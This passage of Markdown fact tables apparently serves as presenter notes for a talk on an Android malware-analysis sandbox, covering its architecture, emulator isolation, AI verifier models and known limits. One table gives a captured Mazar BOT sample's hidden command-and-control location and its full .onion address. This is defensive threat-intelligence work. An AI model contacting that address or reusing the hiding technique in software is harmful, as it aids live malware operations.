| Outcome | Blocked (`blocked: true`), never forwarded | 10 |
| Trigger mechanism | `BOOT_COMPLETED` receiver — no UI interaction needed | 10 |

**Live capture (Mazar BOT)**
| Fact | Value | Slide |
|---|---|---|
| Hidden C2 location | `res/values/strings.xml`, field `server_url`, inside compiled `resources.arsc` | 14 |
| C2 address | `http://pc35hiptpcwqezgs.onion` | 14 |

**Architecture**
| Fact | Value | Slide |
|---|---|---|
| Evidence record path | `artifacts/<sha256>/evidence.json` | 5 |
| Spine writer function | `spine.py::update_layer()` — only writer, atomic, per-layer merge | 5 |
| Emulator config | `sentinel30`, Android 30 Google-APIs x86_64, KVM-accelerated | 10 |
| Isolation verification | Negative check (ping 8.8.8.8 must fail) + positive check (proxy must be reachable) | 10 |
| Whitelist size (L0 impersonation) | 40 hand-curated bank/UPI/gov entities | 7 |
| Knowledge-base size (L4 RAG) | A few hundred entries (MITRE ATT&CK Mobile + YARA-derived + hand-curated India patterns + emerging techniques), TF-IDF + cosine similarity, no vector DB | — |
| AI reasoning-tier model | GLM 5.3 Flash (via aicredits) — L4 adversarial verifier + L2 navigator | 10 |
| AI generation-tier model | GPT-4o-mini (via aicredits) — claim extraction, reasoning-trail structuring | 10 |
| Post-verdict recommendation | `L6/recommend.py` — 7-action closed taxonomy, SOP-KB grounded, mechanically verified, $0.037/run measured | 10 |
| SOP knowledge base size | 21 entries: 11 MITRE Mitigations + 3 CERT-In + 3 RBI + 4 NIST SP 800-61 phases | 10 |

**Known, named limits (cite these proactively if asked "what doesn't work yet")**
| Limit | Detail | Slide |
|---|---|---|
| Emulator parallelism | One instance today; architecturally parallelizable, not yet done | 12 |
| Benign corpus composition | Zero commercial banking apps in F-Droid; hard-negative panel is the named next step | 12, 15 |
| Incoming-SMS Frida hook | Hooks outgoing `sendTextMessage` only; incoming-path hook (`createFromPdu`) is a known gap | — |
| Some rule weights | Provisional until benign corpus fully crosses the B ≥ 213 threshold; system self-flags via `unsupported` stamp | 12 |
